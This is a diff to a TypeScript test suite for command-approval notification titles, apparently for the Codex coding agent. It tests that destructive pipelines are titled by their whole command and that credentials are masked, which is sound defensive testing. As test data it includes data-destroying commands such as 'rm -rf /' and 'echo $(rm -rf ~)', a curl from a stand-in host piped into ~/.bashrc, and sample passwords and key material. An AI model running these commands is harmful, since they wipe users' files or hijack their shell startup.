@@ -1330,6 +1330,17 @@ describe("a file change approval names the files it is asking about", () => {
  *    `soleActionCommand` -> "survives every shape the runtime could put in
  *    commandActions" goes red on `[null]`, throwing inside an RPC the model is
  *    parked on.
+ *  - drop the `SHELL_CONNECTOR_RE` test in `soleActionCommand` -> "never
+ *    titles a pipeline by the one part Codex kept" goes red: `ls | xargs rm
+ *    -rf`, summarised by Codex as the single action `ls`, is titled `Run ls`.
+ *  - drop the verbatim `wrapped.includes` check -> the same case goes red on
+ *    an action whose text is not in the command at all.
+ *  - fold BEFORE the mask in `titleCommandText` (`redactOutput` over the
+ *    folded line) -> "removes a private key block before it folds" goes red:
+ *    the BEGIN header is masked and the key's base64 body reaches the title.
+ *  - drop `redactCommandLine` from `titleCommandText` -> "draws the title on
+ *    one line, with the secrets a command carries masked" goes red on `curl
+ *    -u admin:hunter2`.
  *  - raise or remove `COMMAND_TOOL_MAX_UNITS` on the non wire `tool` -> "cuts
  *    a runaway command inside the column the server will refuse" goes red, and
  *    a body past 98,304 bytes costs the owner the whole card.
@@ -1557,24 +1568,68 @@ describe("a command approval says what it runs, why, and what Always would save"
     // nobody has seen, and the point is that an unseen shape falls back to the
     // wrapped command rather than THROWING inside an RPC the model is parked
     // on, which would hang the turn instead of costing a nicer title.
-    expect(soleActionCommand([{ type: "unknown", command: " ls -la " }])).toBe(
+    const W = "bash -lc 'ls -la'";
+    expect(soleActionCommand([{ type: "unknown", command: " ls -la " }], W)).toBe(
       "ls -la",
     );
-    expect(soleActionCommand([null])).toBeNull();
-    expect(soleActionCommand([undefined])).toBeNull();
-    expect(soleActionCommand(["ls"])).toBeNull();
-    expect(soleActionCommand([{}])).toBeNull();
-    expect(soleActionCommand([{ command: 42 }])).toBeNull();
-    expect(soleActionCommand([{ command: "   " }])).toBeNull();
-    expect(soleActionCommand([])).toBeNull();
-    expect(soleActionCommand({ command: "ls" })).toBeNull();
-    expect(soleActionCommand(undefined)).toBeNull();
+    expect(soleActionCommand([null], W)).toBeNull();
+    expect(soleActionCommand([undefined], W)).toBeNull();
+    expect(soleActionCommand(["ls"], W)).toBeNull();
+    expect(soleActionCommand([{}], W)).toBeNull();
+    expect(soleActionCommand([{ command: 42 }], W)).toBeNull();
+    expect(soleActionCommand([{ command: "   " }], W)).toBeNull();
+    expect(soleActionCommand([], W)).toBeNull();
+    expect(soleActionCommand({ command: "ls" }, W)).toBeNull();
+    expect(soleActionCommand(undefined, W)).toBeNull();
     // MORE THAN ONE action is not a title: the schema lists one action per
     // piped or chained command, so the first of them is only part of what
     // runs, and the caller falls back to the whole wrapped command.
     expect(
-      soleActionCommand([{ command: "ls" }, { command: "rm -rf /" }]),
+      soleActionCommand([{ command: "ls" }, { command: "rm -rf /" }], W),
     ).toBeNull();
+    // Without the wrapped command nothing can say what the parser left out.
+    expect(soleActionCommand([{ command: "ls -la" }], undefined)).toBeNull();
+  });
+
+  it("never titles a pipeline by the one part Codex kept", async () => {
+    vi.useFakeTimers();
+    // ONE action is not one command. Codex's `parse_command` leaves the small
+    // helpers of a pipeline (xargs, tee, sed, awk, head ...) out of
+    // `commandActions` and skips a leading `cd`, so each of these can come
+    // back as a SINGLE action naming only the harmless part. The title is the
+    // push body, and `Run ls` on a lock screen for a delete is the failure.
+    const cases: Array<[string, string]> = [
+      ["bash -lc 'ls | xargs rm -rf'", "ls"],
+      ["bash -lc \"find . -name '*.log' | xargs rm -f\"", "find . -name '*.log'"],
+      ["bash -lc 'curl https://x.example | tee ~/.bashrc'", "curl https://x.example"],
+      ["bash -lc 'cd / && rm -rf *'", "rm -rf *"],
+      ["bash -lc 'make; rm -rf out'", "make"],
+      ["bash -lc 'echo $(rm -rf ~)'", "echo"],
+      ["bash -lc 'sleep 9 & rm -rf x'", "sleep 9"],
+      ["bash -lc 'ls\nrm -rf x'", "ls"],
+    ];
+    for (const [wrapped, kept] of cases) {
+      for (const type of ["unknown", "listFiles", "search", "read"]) {
+        expect(soleActionCommand([{ type, command: kept }], wrapped)).toBeNull();
+      }
+      const body = await post({
+        command: wrapped,
+        commandActions: [{ type: "listFiles", command: kept }],
+        availableDecisions: ["accept", "decline"],
+      });
+      expect(body.text).toBe(`Run ${titleCommandText(wrapped)}`);
+      expect(body.text).not.toBe(`Run ${kept}`);
+    }
+    // An action whose text is NOT in the command is not trusted either,
+    // whatever it says: the title never names text that is not in what runs.
+    expect(
+      soleActionCommand([{ command: "ls" }], "bash -lc 'rm -rf build'"),
+    ).toBeNull();
+    // A plain single command still reads without its wrapper, which is the
+    // whole point of reading the action.
+    expect(
+      soleActionCommand([{ command: "rm -rf build" }], "bash -lc 'rm -rf build'"),
+    ).toBe("rm -rf build");
   });
 
   it("titles a chained command by the WHOLE command, never by its first part", async () => {
@@ -1595,20 +1650,21 @@ describe("a command approval says what it runs, why, and what Always would save"
     expect(body.approvalMeta.reason).toBe("Publish the branch");
   });
 
-  it("draws the title on one line, with every secret in it masked", async () => {
+  it("draws the title on one line, with the secrets a command carries masked", async () => {
     vi.useFakeTimers();
     // The title reaches APNs, FCM, the lock screen and the chat list preview,
     // where `tool` never goes. A heredoc keeps its newlines in the action's
     // command, and an inline bearer token is still a bearer token.
+    // A newline is also a place a second command can hide, so a heredoc is
+    // titled from the WHOLE wrapped command, folded onto one line.
+    const script = "python - <<'PY'\nimport shutil\nshutil.rmtree('build')\nPY";
     const heredoc = await post({
-      command: "powershell -Command python",
-      commandActions: [
-        { command: "python - <<'PY'\nimport shutil\nshutil.rmtree('build')\nPY" },
-      ],
+      command: `bash -lc "${script}"`,
+      commandActions: [{ command: script }],
       availableDecisions: ["accept", "decline"],
     });
     expect(heredoc.text).toBe(
-      "Run python - <<'PY' import shutil shutil.rmtree('build') PY",
+      "Run bash -lc \"python - <<'PY' import shutil shutil.rmtree('build') PY\"",
     );
     expect(heredoc.text).not.toMatch(/[\r\n\t]/);
     const token = "sk-proj-abcdefghijklmnopqrstuvwxyz0123456789";
@@ -1644,6 +1700,43 @@ describe("a command approval says what it runs, why, and what Always would save"
     const inside = titleCommandText(raw);
     expect(inside).toBe(`${lead}Zm9v... x`);
     expect(inside).not.toContain(cut);
+    // THE SHAPES A COMMAND LINE CARRIES and output does not, which the output
+    // mask alone passed through verbatim: a curl user, a URL's userinfo on a
+    // scheme that is not a database, a short credential in an environment
+    // assignment, a password flag, and MySQL's glued `-p`.
+    const leaks: Array<[string, string]> = [
+      ["curl -u admin:hunter2 https://api.example.com", "hunter2"],
+      ["git clone https://kc:S3cretPass@github.com/o/r.git", "S3cretPass"],
+      ["PGPASSWORD=hunter2 psql -h db", "hunter2"],
+      ["API_KEY=abc123 ./run", "abc123"],
+      ["mysql -u root -pSecret1 app", "Secret1"],
+      ["mysqldump --password Secret1 app", "Secret1"],
+      ["deploy --token=ghx_short1 prod", "ghx_short1"],
+    ];
+    for (const [command, secret] of leaks) {
+      const body = await post({
+        command,
+        commandActions: [{ command }],
+        availableDecisions: ["accept", "decline"],
+      });
+      expect(body.text.startsWith("Run ")).toBe(true);
+      expect(body.text).not.toContain(secret);
+    }
+  });
+
+  it("removes a private key block before it folds", () => {
+    // The mask matches a key block ACROSS its lines: the BEGIN line opens it
+    // and everything to the END marker becomes one placeholder. Folded first,
+    // the block is one line, the header alone is masked, and the base64 body
+    // (the key itself) rides the title onto a lock screen.
+    const body = "MIIEowIBAAKCAQEAu1SU1LfVLPHCozMxH2Mo4lgOEePzNm0tRgeLezV6ffAt0gun";
+    const heredoc =
+      "cat > key.pem <<'K'\n-----BEGIN RSA PRIVATE KEY-----\n" +
+      `${body}\n-----END RSA PRIVATE KEY-----\nK`;
+    const title = titleCommandText(heredoc);
+    expect(title).toContain("[private key removed]");
+    expect(title).not.toContain(body.slice(0, 12));
+    expect(title).not.toMatch(/[\r\n]/);
   });
 
   it("keeps the old title on a request to type into a running process", async () => {
@@ -1765,7 +1858,7 @@ describe("a command approval says what it runs, why, and what Always would save"
     vi.useFakeTimers();
     const body = await post({
       reason: "b".repeat(400),
-      command: "wrapped",
+      command: `bash -lc '${"a".repeat(300)}'`,
       commandActions: [{ command: "a".repeat(300) }],
       proposedExecpolicyAmendment: ["c".repeat(700)],
       availableDecisions: [
